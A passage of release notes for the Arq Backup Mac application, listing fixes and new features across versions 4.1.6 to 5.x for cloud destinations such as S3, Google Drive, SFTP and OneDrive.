October 20, 2016

## Improvements

* Added support for new AWS Ohio (us-east-2) region.

## Fixed Issues

* Fixed an issue that could cause "index not found" errors during backup.
* Fixed an issue that could cause Arq to create a new backup record even if no files have changed.
* Remove trailing '/' character from user-entered S3-compatible URLs to avoid errors when connecting to Minio servers.

# Release Notes for Arq Backup Version 5.3.3

October 16, 2016

## Improvements

* Added a workaround for invalid Amazon Cloud Drive response data.
* Added a workaround for encfs volumes that erroneously report ENOENT (not found) error when reading extended attributes of symlinks.

## Fixed Issues

* Fixed an issue that could cause "The operation couldn't be completed (MissingErrorDomain 0)" errors during validation.

# Release Notes for Arq Backup Version 5.3.2

October 11, 2016

## Fixed Issues

* Fixed an issue that could cause 'Tree may not be nil' errors when Arq encounters an error reading file data.

# Release Notes for Arq Backup Version 5.3.1

October 7, 2016

## Improvements

* Improved scanning speed.
* During budget enforcement and removing unreferenced objects, more status updates are given, including how many files have been deleted so far.

## Fixed Issues

* Fixed an issue which could cause budget enforcement to skip actually enforcing the budget.
* Fixed an issue with Google Drive and duplicate items with the same name in the same folder which caused Arq to fail to restore.
* Fixed an issue where Arq didn't correctly reset modified time on symlinks when restoring.
* If the volume disappears during backup, Arq won't save the new backup record that doesn't have all files. It will leave the in-progress backup record.
* Fixed an issue where Arq didn't find a file during restore from another computer's backups if it had cached the list of files and the other computer had subsequently added files.

# Release Notes for Arq Backup Version 5.2.5

September 23, 2016

## Fixed Issues

* Fixed an issue which caused Google Drive backups to fail with 'removeItemById not implemented' errors.

# Release Notes for Arq Backup Version 5.2.4

September 21, 2016

## Fixed Issues

* Fixed an issue which would cause the Arq installer to fail to install properly on macOS Sierra.
* Show backup record ID next to reflog entries.
* Fixed an issue which could cause a crash in Arq Agent's helper program arqcommitter when it creates a new log file.
* Check for S3-compatible URL entered without 'http://' or 'https://' prefix.
* Fixed an issue where AWS request signature errors could occur during backup.
* Fixed an issue where Arq was reporting an error when backing up a file that no longer existed.
* If a request signing error occurs, include the expected and actual "canonical string" values in the error.
* Fixed issues with Google Drive and multiple items with the same name in the same directory.

# Release Notes for Arq Backup Version 5.2.2

August 30, 2016

## Fixed Issues

* Added a workaround for Amazon Cloud Drive problems which result in random HTTP 400 and 408 errors.
* On backup start, wait up to 30 seconds for an allowed network before failing with an error. This allows for a computer that just woke up to establish network connectivity.
* If Arq is unable to write a README.TXT file in the user's Google Drive account because the quota has been exceeded, ignore the error so that the user can add the Google Drive destination in Arq and then be able to use Arq to delete the "hidden" data (if the user chose to use the hidden "appdata" folder when configuring Arq).
* Fixed an issue where Arq would not show another computer's backup set added later because it used cached data instead of requerying for the current list of backup sets.
* Fixed a database issue which could cause Arq to spend a very long time on a database query for very large (multi-terabyte) backup datasets.
* Fixed an issue which could cause log files to prematurely rotate. Arq, Arq Agent and helper programs will now write 100 MB log files, keeping up to 10 files.
* Removed "wl.basic" from the list of OneDrive permissions requested by Arq, because Arq doesn't need it.

# Release Notes for Arq Backup Version 5.2.1

August 19, 2016

## Fixed Issues

* Fixed an issue which could cause Arq Agent to crash.
* Fixed an issue which caused Arq to report uploading during validation when it wasn't really uploading. The issue affected backup data that was originally created with Arq version 4 or older.

# Release Notes for Arq Backup Version 5.2

August 8, 2016

## Improvements

* The data validation process now goes beyond verifying the existence of all needed objects at the destination; it now verifies that the contents of the objects at the destination are correct.

## Fixed Issues

* Fixed an issue where an SFTP error could be reported as "null" without the actual error message.

# Release Notes for Arq Backup Version 5.1.9

July 30, 2016

## Fixed Issues

* Added logging for error conditions during backup.
* Changed next backup time calculation for daily backups so that it's at the chosen hour even if a backup has already happened today.
* Fixed an issue where daily backup may not begin on computer wake if computer was asleep at the scheduled backup time.
* If user has chosen specific network interfaces and current network interface can't be determined, do not back up.
* When deleting a Dropbox folder, recursively delete the contents first to work around a Dropbox issue.
* If backing up to a local folder, skip checking whether we're on an allowed network.
* When browsing other backup sets, fixed an issue where too much cached information was being cleared, causing browsing to be very slow every time.

# Release Notes for Arq Backup Version 5.1.8

July 4, 2016

## Fixed Issues

* Fixed an issue where Arq could throw an exception and show a blank window on startup for Google Cloud Storage.
* Fixed another resize issue on OS X Yosemite.
* Fixed an issue which caused Arq to report SFTP errors as "MissingErrorDomain".
* Added debug logging for detecting network interfaces.
* Automatically accept Arq 4 lifetime license code instead of requiring an Arq 5 license code.

# Release Notes for Arq Backup Version 5.1.7

June 21, 2016

## Fixed Issues

* Fixed an Arq Agent crash that occurred on OS X 10.9 during backup.

# Release Notes for Arq Backup Version 5.1.6

June 19, 2016

## Fixed Issues

* Fixed an issue where Arq Agent was writing extra newline characters to the log file.
* Fixed an issue which prevented search results from being displayed.
* Fixed an issue where restored files and directories created by Arq were made world-writable.

# Release Notes for Arq Backup Version 5.1.5

June 9, 2016

## Fixed Issues

* Fixed an issue with incorrect sizes reported in the backup record display.
* Fixed an issue where creating an IAM user would fail if the computer's locale was set to other than US.
* Fixed an issue where deleting SFTP directories was failing and not reporting an error.
* Fixed an issue where overwriting a file at an SFTP server could fail trying to delete the existing file if there was no existing file.
* Fixed a resizing issue on Yosemite which caused the right side of the main window to become garbled.
* Enabled Command-A (select all) and Command-C (copy) in the backup session log window.

# Release Notes for Arq Backup Version 5.1.4

June 5, 2016

## Fixed Issues

* Fixed an issue where, if Amazon Cloud Drive access had been revoked and the user re-authorized it via Arq, Arq would get stuck in a loop.
* Fixed an issue during restoring which caused Arq to request much more Glacier data than the user requested.
* Fixed an issue which caused incorrect file sizes to be displayed.
* Increased SFTP timeout from 30 seconds to 120 seconds.
* Fixed an issue which caused permission errors because SFTP was trying to enumerate the parent directory's contents instead of doing a "stat" call on the file/directory in question.
* Fixed an issue where validation could start even if it was unchecked in the destination preferences.
* Fixed an issue which caused the fixed-transfer-rate setting to have no effect if the chosen transfer rate was 8 KB/s or less.
* Fixed an issue which could cause arqcommitter (Arq Agent's helper program) to stall on start, preventing backup progress.

# Release Notes for Arq Backup Version 5.1.3

May 24, 2016

## Fixed Issues

* Fixed a crash that could occur with some SFTP backup data created by older versions of Arq.
* Fixed an issue that was cause Arq to say detected download speed is zero.
* Fixed an issue that could cause a crash when deleting a backup set.
* Fixed an issue that could cause a crash when Arq encounters invalid pack data.
* Fixed an issue where, when backing up to a local folder, Arq would sometimes report 'File exists' or 'Resource busy' error.
* Fixed a crash that could occur after closing the backup session log window.
* Fixed a crash that could occur when attempting to parse a Dropbox error message.

# Release Notes for Arq Backup Version 5.1.2

May 16, 2016

## Fixed Issues

* Fixed an issue which could cause Arq to get "stuck" backing up.

# Release Notes for Arq Backup Version 5.1.1

May 16, 2016

## Fixed Issues

* Improved scanning performance in some scenarios, especially after a restart when working on an initial backup.
* Change the status message to say "Stopping" when you pick "Stop" from the menu.
* Fixed an issue where clicking "Don't start at login" doesn't make the prompt go away.
* Fixed an issue where Arq wouldn't allow S3 bucket names to start with a number.

# Release Notes for Arq Backup Version 5.1

May 10, 2016

## New Features

* Arq shows the current directory being scanned.

## Fixed Issues

* Fixed an issue where object counts were incorrect when Arq has to restart listing an Amazon Cloud Drive folder.
* Added logging when there are errors reading the email password.
* Fixed an issue which could cause Arq to re-upload objects already at the destination.
* Improved Info and Detail level logging.
* Removed pack reuse scheme to avoid any possibility of losing packed information.

# Release Notes for Arq Backup Version 5.0.12

May 8, 2016

## Fixed Issues

* Fixed an issue which could cause an 'unable to find node' error when backing up '/' and files are modified during backup.
* Log more information when creating an IAM user fails.
* Check for items in an Amazon Cloud Drive folder with duplicate names and log a warning.
* Updated DreamObjects settings to use their new hostname objects-us-west-1.dream.io.
* Fixed an issue where adopting an SFTP backup set using a private key file and passphrase would result in an error about the private key file format.

# Release Notes for Arq Backup Version 5.0.11

May 5, 2016

## Fixed Issues

* Made data validation optional, via a checkbox in the destination preferences.
* Changed Arq Agent to wait 2 minutes between finishing a backup and starting data validation, to avoid "eventual consistency" issues (delays in getting accurate file lists from Amazon Cloud Drive and other providers).
* Fixed an issue where, during data validation, Arq Agent wasn't properly checking for a running Arq process and aborting if it found one.

# Release Notes for Arq Backup Version 5.0.10

May 4, 2016

## Fixed Issues

* Fixed an issue where Arq could reuse the wrong pack, causing excessive download and slow progress.
* Fixed an issue where Arq might skip a folder that has changes in it.

# Release Notes for Arq Backup Version 5.0.9

May 3, 2016

## Fixed Issues

* Fixed an issue where, if a backup session aborts with an in-progress backup record, some files may not get backed up.

# Release Notes for Arq Backup Version 5.0.8

April 29, 2016

## Fixed Issues

* Fixed an issue that could cause 'Older backups missing' errors due to cache problems.

# Release Notes for Arq Backup Version 5.0.7

April 29, 2016

## Fixed Issues

* Arq now runs the "preflight" script before checking whether the destination (local path or otherwise) exists.
* Fixed a potential bug in the way Arq detects file/directory changes.
* If you add an AWS destination using an IAM user with a very restrictive IAM policy, Arq can't get the list of buckets but you can type the existing bucket's name into the "create bucket" field. Arq will not throw an error if the bucket already exists and is owned by you.
* Fixed an issue where Arq would show an "HMACSHA256 doesn't match" error instead of prompting for the backup set's encryption password.
* Fixed an issue where the OK button for the Edit Backup Selections window didn't work for OS X versions older than 10.10.
* Added OAuth scope for Google Drive to workaround persistent 500 errors returned by Google Drive.
* Fixed an issue where Arq would crash if OS X returned zero-length paths for mount points.

# Release Notes for Arq Backup Version 5.0.5

April 25, 2016

## Fixed Issues

* Fixed an issue that caused the restorer to sometimes fail on startup, saying "Caching object list" forever.
* Fixed an issue that caused budget enforcement to run when it was unchecked.
* Fixed an issue that caused the select-network-interfaces dialog to fail when OS X presented unexpected network interface information.
* Shortened the edit-destination preferences window so it fits on Macs with small screens.
* Added a warning message that Arq will restart when you click the Clear Cache button.
* Fixed an issue where the user could enter an incorrect old password when changing the encryption key.

# Release Notes for Arq Backup Version 5.0.4

April 20, 2016

## Fixed Issues

* Fixed an issue which prevented Arq from backing up using administrator privileges.
* Fixed an issue which caused 'attempt to write a readonly database' errors in Arq Agent after data validation until Arq Agent is restarted.
* Fixed an issue which prevented thinning backup records.
* If sending email fails, log the error in the session log.

# Release Notes for Arq Backup Version 5.0.3

April 18, 2016

## Fixed Issues

* Fixed a layout issue.
* Fixed an issue which sometimes caused "Error (null)" messages when adding Amazon Cloud Drive or Google Drive destinations.
* Fixed an issue which prevented adding a DreamObjects destination.
* Fixed an issue where SFTP parent directories weren't being created properly.
* Updated to libssh2 version 1.7.0 to get the fixes for CVE-2016-0739 "libssh: Diffie-Hellman bits/bytes confusion bug" and CVE-2016-0787 "libssh2: Diffie-Hellman bits/bytes confusion bug".
* Fixed an issue where Arq wasn't using the S3-compatible destination's port number correctly when listing backup sets in the RESTORE FILES section.

# Release Notes for Arq Backup Version 5.0.2.1

April 16, 2016

## Fixed Issues

* Fixed an issue which caused OS X to always prompt about Arq being "an application downloaded from the internet".
* Fixed an issue which caused "unexpected message type" errors during backup.
* Fixed an issue which caused "access denied" error when calculating storage size for some AWS regions when using a "restricted IAM user".
* Fixed an issue which caused "authorization header is malformed" error for some AWS regions when changing AWS credentials.
* Fixed an issue which caused backup to fail with "This region does not support transition to GLACIER" for some AWS regions.
* Fixed 'folder arqcommitter doesn't exist' error when attempting to send log files before doing a backup.

# Release Notes for Arq Backup Version 5.0.1

April 14, 2016

## Fixed Issues

* Fixed a permissions problem on cache files that was causing not-found errors and general slowness.

# Release Notes for Arq Backup Version 5.0.0.65

April 12, 2016

Arq 5 for OS X includes lots of new features and improvements!

* Massively faster with multiple threads and LZ4 compression
* Much smaller memory footprint than Arq 4
* Search for files across all backup records
* More control over network usage: prevent backups while tethered to your phone!
* Detailed backup session logging
* Detailed email reports: what's being backed up, how much was uploaded, how long it took
* Back up to a local folder or NAS
* Run scripts before and after backup
* Support for AWS S3 "Infrequent Access" storage class
* Auto-update (no more installing Arq updates)
* CPU throttling
* "Exclude items skipped by Time Machine" option
* Encryption improvements (see [data format spec](../arq_data_format.txt))
* Lots of smaller improvements

# Release Notes for Arq Backup Version 4.14.5.1

September 13, 2015

## Fixed Issues

* Read OneDrive folder listings page by page to work around timeout problems with OneDrive's API.
* Added a workaround for a problem when trashing an Amazon Drive file. If Amazon gives a 500 error and Arq retries, sometimes the file was actually trashed and Amazon returns an undocumented 409 error. Arq now catches that and moves on.
* If schedule is set to manual, validationg interval fields in the settings UI are disabled.
* Fixed an issue where cache files were potentially written with the wrong user ID, causing permission-denied errors and slower performance.

# Release Notes for Arq Backup Version 4.14.4

August 21, 2015

## Fixed Issues

* Added a workaround for Amazon Drive. Amazon Drive sometimes doesn't return a full list of items in a directory (when a 500 error occurs during paging through the listing), causing Arq to fail to load backup records. Arq now compares the actual total item count received to the expected total; if it didn't get all the items, it retries until it does.
* Fixed issues where Arq wasn't caching Google Drive folder IDs properly, causing the error "folderId not found for path" on Google Drive setup.
* Fixed an issue with OneDrive where Arq Agent didn't immediately see folders configured for backup.
* Improved OneDrive caching for better backup and restore performance.

# Release Notes for Arq Backup Version 4.14.3

August 10, 2015

## Fixed Issues

* If Amazon Cloud Drive returns 400 'Cannot read from request' error, try again.
* If a 500 error occurs during reading pages of Amazon Cloud Drive folder listing, restart the folder listing to ensure correct results.
* Clear Amazon Cloud Drive cache when reloading object set (before validating data).
* Fixed an issue which caused erroneous "unknown enforcement error" message.
* Fixed the incorrect edit-destination view for OneDrive.
* Fixed an issue where the log level for Arq.app would change to Debug on startup.

# Release Notes for Arq Backup Version 4.14.2

August 6, 2015

## Fixed Issues

* Fixed a crash that sometimes occurs when Arq first starts up and loads a cached Google Drive folder list.
* Fixed an issue with Amazon Cloud Drive caching which can cause "error " errors.

# Release Notes for Arq Backup Version 4.14

July 20, 2015

## New Features

* "Thinning" backups (keeping hourly backups for the past 24 hours, daily backups for the past month, and weekly backups after that) is now optional. Check "Thin backups" in Arq's preferences to enable it.
* New users will now be prompted to select bucket name and region if choosing AWS or Google Cloud Storage.

## Fixed Issues

* If duplicate items with the same name in the same folder in Google Drive are found, keep the newest one.
* Added a workaround to detect and merge duplicate items in Google Drive.
* Fixed an issue where Arq wasn't prompting to re-authorize if Amazon Cloud Drive access was revoked.
* Fixed an issue where cached Google Drive data would cause not-found errors when removing and re-adding Google Drive as a destination.
* Fixed an issue where the status message from the agent wasn't always being sent to the Arq app.
* Stopped excessive logging of Amazon Cloud Drive folder results when log level is set to Debug.
* If Amazon Cloud Drive returns a 409 (node "concurrently modified") error, retry.
* Don't log SFTP authentication failures as errors as we try multiple authentication methods.
* Fixed issues with excessive memory usage with Amazon Cloud Drive.
* Removed the unreliable "Send Bug Report" and "Request Support" app menu items, prompting the user to send email instead.
* Sort the "View Items Being Backed Up" window's items in a separate thread to improve app responsiveness.
* Migrate Amazon Cloud Drive objects to subdirectories to avoid potential API issues if there are too many items in 1 directory.
* Improved Amazon Cloud Drive cache efficiency.
* Improved OneDrive cache efficiency.
* If backup schedule is set to manual, do not do data validation/budget enforcement either.

# Release Notes for Arq Backup Version 4.13.2

July 13, 2015

## Fixed Issues

* Fixed an issue that would cause massive RAM usage if configured to back up "/".
* Fixed a crash that occurs if the SFTP server fails to return a user auth list.
* Fixed an issue where Amazon Cloud Drive returns a 400 status code with JSON response showing statusCode:404 instead of a 404 status code.

# Release Notes for Arq Backup Version 4.13.1

July 8, 2015

## Fixed Issues

* If Amazon Cloud Drive returns a 429 "Rate exceeded" message, Arq will wait and then retry.

# Release Notes for Arq Backup Version 4.13

July 2, 2015

## New Features

* Added support for backing up to your [Amazon Cloud Drive](https://www.amazon.com/clouddrive/home) account! It's $59.99 per year for unlimited secure storage of your backup data.

## Fixed Issues

* Made the animation of the menubar icon more subtle, less distracting.
* Fixed an issue where adopting a backup set could cause a different backup set to be deleted.
* Reduced the CPU impact during some parts of the backup process.

# Release Notes for Arq Backup Version 4.12.1

June 26, 2015

## Fixed Issues

* Added another query parameter to get around Dropbox file limit issues.
* Changed SFTP authentication to try other auth methods if keyboard-interactive fails.
* Added a feature to automatically clean up any duplicate entries in Google Drive data.
* If AWS returns invalid XML when Arq is searching for backup sets to restore from, skip the problem data.
* Fixed an issue where Arq could potentially create 2 Google Drive directories with the same name at the same location (because, weirdly, Google Drive's API allows that).
* Fixed an issue where Arq would crash after clicking the Close button when viewing Glacier restore errors.
* Fixed an issue where Arq could crash while loading folder lists when multiple Google Drive destinations are configured.
* Changed Google Drive implementation from delete-and-insert to update to work around a bug in Google Drive where it says it deleted a file but it didn't actually delete the file.

# Release Notes for Arq Backup Version 4.12

May 26, 2015

## New Features

* Added support for "keyboard-interactive" SFTP authentication.
* Added a "reflog viewer" so you can recover an older backup-record list (see the help docs for more details).
* Added caching to speed up Dropbox read performance.
* Added caching to speed up OneDrive read performance.
* In the agent menu, show next backup and last backup dates in relative form (e.g. 'Today'), formatted in the current locale.

## Fixed Issues

* Fixed an issue where if Arq Agent were paused and the computer went to sleep, when it woke up Arq Agent would resume before it should.
* Fixed an issue where the menu didn't refresh properly when a pause period expired.
* Check the SFTP server's host fingerprint and warn the user if it has changed (thanks to Sebastian Wyder for pointing this out!)
* Added a query parameter to get around Dropbox file limit issues.
* When Dropbox returns access-token error, prompt to re-authorize.
* Properly set cookies so that the OAuth 2 sign-in windows for the various services don't cache credentials.
* Changed http check-for-udpdates URL to https.

# Release Notes for Arq Backup Version 4.11.5

May 18, 2015

## Fixed Issues

* If any error occurs backing up a file, log it as an error and continue on.
* Fixed a bug which could cause loss of backup records if a network error or other unexpected error occurs at a specific instant when Arq tries to read a backup record header during data validation.

# Release Notes for Arq Backup Version 4.11.3

May 5, 2015

## Fixed Issues

* Fixed an issue where budget enforcement fails when objects are missing in old backup records.
* Fixed an issue where Arq doesn't properly store the destination's secret key when adoping a backup set, causing it to prompt for the secret key again.
* Fixed an issue where Arq doesn't retry on HTTP 509 errors from OneDrive.
* Increased the HTTP timeout to 90 seconds to get around issues with OneDrive.
* Re-added the Relocate button, in addition to the Detach/Attach button.
* Performance improvements.
* Updated the app's icon.
* Updated URLs to point to the new arqbackup.com domain.

# Release Notes for Arq Backup Version 4.11.2

April 12, 2015

## Fixed Issues

* Fixed an issue where Arq was incorrectly parsing date values in Dropbox responses.
* Fixed an issue where multiple Google Cloud Storage destinations weren't appearing under RESTORE FILES.

# Release Notes for Arq Backup Version 4.11.1

April 2, 2015

## Fixed Issues

* Fixed an issue where Arq wouldn't save the OneDrive destination because OneDrive was unexpectedly returning null email address.

# Release Notes for Arq Backup Version 4.11

March 28, 2015

## New Features

* Added support for backing up to Microsoft OneDrive!
* Now showing Amazon region in messages, instead of just "To Amazon".
* If Arq is paused and you pick "Back Up Now" from the menu, it "un-pauses" and starts backing up.

## Fixed Issues

* If the Google Cloud Storage account access has been revoked, prompt the user to re-authorize.
* If Google Cloud Storage returns a 429, 500 or 503 error, wait and then retry.

# Release Notes for Arq Backup Version 4.10.2

March 15, 2015

## Fixed Issues

* Fixed an issue where backups would not appear under the "RESTORE FILES" section for Google Cloud Storage destinations.

# Release Notes for Arq Backup Version 4.10.1

March 14, 2015

## New Features

* Added support for backing up to Google Cloud Storage Nearline.

# Release Notes for Arq Backup Version 4.9.2

March 5, 2015

## New Features

* Added error logging for the case where SFTP init fails.

## Fixed Bugs

* Reduced the number of API calls when backing up to Dropbox.
* Fixed an issue where data validation for Dropbox mistakenly thinks no objects exist at Dropbox.
* Set cache policy to ignore when loading XML update-spec, to avoid erroneous "Update available" messages.
* Removed the check for free space on SFTP server because most SFTP servers don't support the API call.

# Release Notes for Arq Backup Version 4.9.1

February 25, 2015

## New Features

* Added "archiving" feature: Select a folder and click "Detach"; Arq will skip that folder during backup, but its backup records will remain at the destination.

## Fixed Bugs

* Fixed an issue when attempting to read contents of a non-existent Dropbox directory that caused Arq to behave like you were typing in the wrong encryption password when restoring.
* If Dropbox returns a 429 (rate-limiting) error during backup, sleep and try again. (The main UI will show the error instead of retrying, so that it doesn't seem to hang forever.)
* Migrate Arq data in Dropbox from 2-directory structure to single directory structure because if the object-list cache file goes missing, it takes way too long to read the contents of potentially 65,536 directories.

# Release Notes for Arq Backup Version 4.8

February 23, 2015

## New Features

* Added Dropbox as a backup destination. Use your Dropbox account's space to store your backups.
* Added a "Change Host and Port" button in SFTP destination settings window to allow for changing hostname and/or port of SFTP server.

## Fixed Bugs

* Changed the "Delete All Google Drive Data Created by Arq" button to delete all Arq-created backups in the Google Drive account, whether they were created in the 'appdata' folder or not.
* Changed the scope of Google Drive authorization so that Arq can see all Arq-created backups in the Google Drive account.
* Changed Arq to compensate for incorrect storage types written to old S3/Glacier-storage-class backup records by old versions of Arq.
* Updated AWS pricing information shown in Arq.

# Release Notes for Arq Backup Version 4.7.5

December 2, 2014

Added an "Enter License Code" function for use with a new license scheme.

# Release Notes for Arq Backup Version 4.7.4

November 23, 2014

## Fixed Bugs

* For non-AWS S3-compatible destinations, check all buckets for Arq-created backups when showing backup set list under "RESTORE FILES".
* Set ISO 8601 date using US locale to avoid the error "AWS authentication requires a valid Date or x-amz-date header".
* Fixed a memory leak when backing up to Google Drive.

# Release Notes for Arq Backup Version 4.7.3

November 14, 2014

## Fixed Bugs

* Fixed another memory leak.

# Release Notes for Arq Backup Version 4.7.2.1

November 12, 2014

## Fixed Bugs

* Don't use an NSOperationQueue with NSURLSessionTask because it can cause a hang.
* Fixed the reporting of "bytes skipped" when uploading incremental updates of large files.

# Release Notes for Arq Backup Version 4.7.2

November 9, 2014

## Fixed Bugs

* Changed to NSURLSession networking library (for OS X 10.9 and above) to work around a memory leak that occurred at random times during backup.

# Release Notes for Arq Backup Version 4.7.1

November 5, 2014

## Fixed Bugs

* Made the menubar icon darker black on OS X Mavericks.
* Fixed a bug which caused a "This key does not exist in our records" error when trying to use an existing bucket with DreamObjects.
* Worked around a bug in Apple's networking library that was causing a memory leak on OS X Yosemite.
* Fixed a memory leak that occurred when backing up to AWS.

# Release Notes for Arq Backup Version 4.7

October 28, 2014

## New Features

* Added support for new AWS Frankfurt region.
* Added a button to delete all Arq-created data from your Google Drive account.
* Switched to [AWS Signature Version 4](http://docs.aws.amazon.com/AmazonS3/latest/API/sig-v4-authenticating-requests.html) for signing AWS requests.
* Changed the default to not use the hidden "appdata" folder when adding a Google Drive account because it was causing too much confusion. While it's nice to store data in the "appdata" folder so that it doesn't clutter your Google Drive activity view, it's difficult to see or delete that data when you need to.

## Fixed Bugs

* Fixed an issue on OS X Yosemite where errors would get the description 'Operation could not be completed' instead of the actual error message.
* If the user tries to add a folder for backup to Google Drive and Arq's Google Drive access has been revoked, offer to let the user grant access instead of just showing an error.

# Release Notes for Arq Backup Version 4.6.2

October 20, 2014

## Fixed Bugs

* Fixed an issue where the backup process aborted if there's an error creating an FSRef on OS X Yosemite (because it's not a valid file for creating an FSRef).

# Release Notes for Arq Backup Version 4.6.1

October 19, 2014

## Fixed Bugs

* Updated menubar icon to work in Yosemite "dark menu bar".
* If extra whitespace was copied/pasted into AWS key fields, it's removed automatically.

# Release Notes for Arq Backup Version 4.6

October 16, 2014

## New Features

* If agent is configured to check for app updates, agent will show a user notification when an update is available.
* Added a "Remove Unreferenced Objects Now" menu item to the agent's menu which causes Arq to immediately clean up any objects at the destination that aren't referenced by any backup records.
* Added a quota check for Google Drive so that Arq stops backing up if Google Drive usage is within 1.5GB of the user's quota.

## Fixed Bugs

* Fixed a bug where, if you don't know the encryption password and attempt to delete a backup set anyway, it was failing with a bad-decrypt error.
* Changed the max-keys parameter for Amazon list-objects requests to 500 to try to avoid an Amazon issue of garbling XML output.
* If password verification fails when user is trying to delete a backup set, offer to delete it anyway, because the user has permission to modify/delete the data, and it could be incomplete data. For example, if the user disconnected Arq from her Google Drive account and Google deleted some of the data and then the user reconnected Arq for the purpose of deleting the backup set, the password verification might fail.
* Fixed an issue where Arq wasn't properly detecting a Google Drive "Rate Limit Exceeded" error and retrying.
* Log XML data when an XML parse error occurs.

# Release Notes for Arq Backup Version 4.5.5

September 12, 2014

## Fixed Bugs

* Fixed an issue where unexpected JSON from Google Drive resulted in Arq thinking objects were much larger than they actually were, which could result in the budget-enforcement process deleting more backup records than it should.
* Fixed an issue where, after data validation, if there was no budget set Arq would not delete unreferenced objects.
* Fixed an issue with restoring "locked" files that resulted in Arq reporting an "Access to this item was denied" error.

# Release Notes for Arq Backup Version 4.5.4

August 19, 2014

## Fixed Bugs

* Fixed the 'absurd string length' error caused by an index file with incorrect offsets in it. Arq will recreate the index file from the pack data, and replace the bogus index file.

# Release Notes for Arq Backup Version 4.5.3

August 12, 2014

## Fixed Bugs

* Fixed an issue with Google Drive where Arq would occasionally crash when adding Google Drive as a destination.

# Release Notes for Arq Backup Version 4.5.2

August 11, 2014

## Fixed Bugs

* Fixed an issue with Google Drive where Arq would erroneously try to create the 'appdata' folder, a special folder which always exists.

# Release Notes for Arq Backup Version 4.5.1

August 11, 2014

## Fixed Bugs

* Changed Google Drive scope to avoid intermittent access-denied errors from the Google Drive API.

# Release Notes for Arq Backup Version 4.5

August 11, 2014

## New Features

* Support for backing up to your own Google Drive storage!

## Improvements

* During Glacier restore, show messages like 'Waiting for objects to become downloadable' to give a better indication of what's happening while Arq waits for Glacier.
* Added help bubbles during initial setup to show what is being backed up and where the Arq Agent menubar icon is.
* Reduced the number of prompts during the initial setup.

## Fixed Bugs

* Fixed an issue where Arq incorrectly treats non-AWS destination data as Glacier data.
* Fixed the 'error making FSRef for /dev' error.
* Fixed an issue where Arq was storing SFTP data in too many subdirectories resulting in very slow object-list retrieval during data validation and budget enforcement.
* Fixed an issue where the RESTORE FILES section wasn't showing Greenqloud backups from other buckets.
* Fixed an issue where SFTP destinations created by previous versions of Arq had a double-slash in the path.
* Fixed an issue where Arq failed to back up to SFTP servers that behave badly (not giving not-found errors when Arq tries to read a file that doesn't exist).
* Stop shifting keyboard focus to the backup record when the user selects a backup record in the source list.
* If you attempt to submit feedback and an error occurs, the feedback window doesn't close and your input is not lost.
* Removed the 'S3' text in the size calculations for non-S3 destinations.

# Release Notes for Arq Backup Version 4.4.1

June 26, 2014

## Fixed Bugs

* Fixed an SFTP issue where, if you supply a relative path and your home directory on the SFTP server is "/", the path ended up being "//relativepath" which caused backup errors.
* Fixed the "Delete This Backup Set" button.
* Show the "Trash" folder for deleted legacy Glacier folders.
* Fixed a "hostname could not be found" error for EU buckets caused by Amazon changing their loation identifier from "EU" to "eu-west-1".
* Fixed an issue where the legacy Glacier vault was still shown in the window after you clicked the button to delete it.
* Fixed a 10.7-only issue with Google Cloud Storage where the generated Date header was not in a format that Google accepted.
* For backups to DreamObjects, handle the non-AWS-format error response when DreamObjects returns a 500 error.
* Added a permission to the restricted IAM user that Arq creates so that that user can list enough of the bucket to find its own backups.

# Release Notes for Arq Backup Version 4.4

June 19, 2014

## Improvements

* Reorganized the main window into "Configure Backups" and "Restore Files" sections to more closely match the activities that a user would typically want to do.
* Revamped the new-user flow so that it's more clear what to do -- either set up backups or restore files.
* Under the "Restore Files" section, search for and show **all** the backup sets in the Amazon account (or SFTP directory or S3-compatible account), so that it's easier to find your old backups when you install Arq on a new computer..
* Rewrote, updated and expanded the help documentation.
* If you try to quit Arq after defining a destination but not configuring anything to back up to that destination, Arq warns you and offers to back up your home folder.
* Moved the (legacy) Glacier vaults into a separate window. Pick "Legacy Glacier Vaults" from the menu to get a list, check each one for corresponding Arq metadata, and delete it if desired.
* Added a delete-individual-backup-record function. Select a backup record to view it; then click the Delete button on the top right to delete just that backup record.

# Release Notes for Arq Backup Version 4.3.1

June 13, 2014

## Fixed Bugs

* Fixed an issue where, during first-time setup, the S3 bucket wasn't always created.

# Release Notes for Arq Backup Version 4.3

June 9, 2014

## Improvements

* Simplified the first-time setup of Arq by choosing sensible defaults (which can be changed later by the user).
* Added "Add Home Folder to Backups" menu item which adds the home folder with standard exclusions.
* Improved CPU efficiency during validation.
* Show small file sizes as 'n bytes' instead of '0.0KB'.

## Fixed Bugs

* Fixed "No S3 bucket name given" error.
* Fixed a crash that occurs during some SFTP connection errors.

# Release Notes for Arq Backup Version 4.2.3

May 14, 2014

## Fixed Bugs

* Fixed a bug where the validation code was checking the wrong return value, eventually resulting in a "Tree may not be 0 bytes" error message.
* Fixed an issue where the validation code was doing excessive checking of object-existence at the target causing slow performance.

# Release Notes for Arq Backup Version 4.2.2

May 8, 2014

## Fixed Bugs

* Fixed an issue which caused a "must be S3 or S3Glacier" crash during validation.
* Fixed an issue where enforcement error returns a "null" error message instead of the actual message.
* Fixed an issue which returned a "pack index data length 0 is smaller than size of pack\_index" error.
* On launch after update, if run-as-root was set previously, prompt the user to re-add run-as-root permissions to the new update.
* Fixed an issue where, if you choose "back up home folder minus caches and logs" it still backs up caches and logs.

# Release Notes for Arq Backup Version 4.2.1

May 2, 2014

## Fixed Bugs

* Fixed object-not-found issues in restoring from a Glacier folder that was originally backed up with Arq 3 and subsequently backed up with Arq 4.

# Release Notes for Arq Backup Version 4.2

April 29, 2014

## New Features

* Allow relative path or no path for SFTP targets. Arq figures out the absolute path for you.
* S3 and S3/Glacier totals are shown separately when you click "Calculate".

## Fixed Bugs

* Don't allow more than 59 minutes after the hour in the target preferences.
* Removed device ID from the backup file/folder info so because OS X randomly changes the device ID which was making all the files look modified in Arq.
* Fixed an issue where files restored from another computer's backups were owned by root.
* Fixed an issue where modification time wasn't being set properly on some restored files.
* Fixed an issue where backup couldn't be stopped if it was in the midst of retrying to connect to an SFTP server.
* Fixed an issue where Arq Agent would calculate storage totals even if budget wasn't enabled for the target.
* Fixed an issue where the progress number in the status message shown in the main app wasn't in sync with the progress number shown below the progress bar.
* Fixed an issue where the progress number displayed could incorrectly exceed the total number by a large margin.

# Release Notes for Arq Backup Version 4.1.7

April 23, 2014

## Fixed Bugs

* Fixed an issue that caused Arq Agent's helper program to crash when a backup error occurs and no error information is available.
* Removed unreliable "multi-threaded processing" option.

# Release Notes for Arq Backup Version 4.1.6

April 22, 2014

## Fixed Bugs

